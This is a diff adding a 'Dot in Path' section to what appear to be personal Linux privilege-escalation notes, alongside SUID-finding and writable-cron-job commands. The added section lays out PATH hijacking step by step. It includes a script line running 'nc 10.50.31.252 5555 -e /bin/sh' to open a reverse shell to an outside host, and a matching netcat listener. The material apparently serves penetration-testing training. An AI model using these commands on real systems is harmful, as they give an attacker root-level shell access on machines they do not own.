@@ -15,6 +15,19 @@ Take note of commands that are allowed, input command into GTFO-Bins
 - find / -type f -perm /6000 -ls 2>/dev/null
                          |______________________SUID and SGID 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Dot in Path
+- echo $PATH
+- PATH=.:$PATH
+
+- vim <command running after dot in path> 
+      - #!/bin/bash
+        nc 10.50.31.252 5555 -e /bin/sh
+
+- chmod +x <script_name>
+
+- From lin-ops
+      - nc -lp 5555
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 CronJobs
 
 find /var/spool/cron/crontabs /etc/cron* -writable -ls - finds any cron file or directory that can be written to.
